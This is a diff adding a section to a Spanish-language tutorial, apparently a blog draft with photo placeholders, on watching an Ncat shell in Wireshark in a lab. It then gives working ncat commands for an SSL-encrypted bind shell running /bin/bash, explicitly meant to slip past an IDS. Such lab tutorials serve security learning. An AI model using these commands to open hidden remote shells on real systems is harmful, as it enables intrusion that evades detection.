@@ -32,4 +32,30 @@ Antes de ponernos a escribir comandos etc, vamos a poner a Wireshark a seguir lo
 
 (poner foto aki)
 
+Ahora si podemos escribir comandos en la consola, podemos hacer un pwd o lo que se nos ocurra:
+
+(poner foto aki)
+
+luego si nos vamos a Wireshark, vemos que está capturando tráfico, vamos a ver que nos puede mostrar Wireshark, lo que hacemos es clickear un paquete de red, click derecho, nos vamos a follow y después TCP stream, nos debería aparecer algo así:
+
+(poner foto aki)
+
+y podemos ver que la conexión no está encriptada por lo tanto un IDS te lo puede detectar fácilmente.
+
+## Encriptando conexión con Ncat
+
+Ahora lo que vamos a hacer es encriptar nuestra conexión para así poder hacer un bypass al IDS, matamos todos los procesos que teníamos antes, el procedimiento es el mismo solo que ahora los comandos cambian.
+
+Vamos a escribir en la consola de Ubuntu ```ncat --exec /bin/bash -vnl 1233 --ssl``` y en la de Kali ```ncat -nv 172.16.211.131 1233 --ssl``` ponemos a Wireshark a capturar tráfico de red y esto es lo que nos sale:
+
+(poner foto aki)
+
+Nos vamos a Wireshark, mismo procedimiento y nos tendría que salir así:
+
+(poner foto aki)
+
+Esto para un IDS, no le hace sentido por lo tanto no lo va a considerar cómo actividad sospechosa o intrusión ;)
+
+
+
 
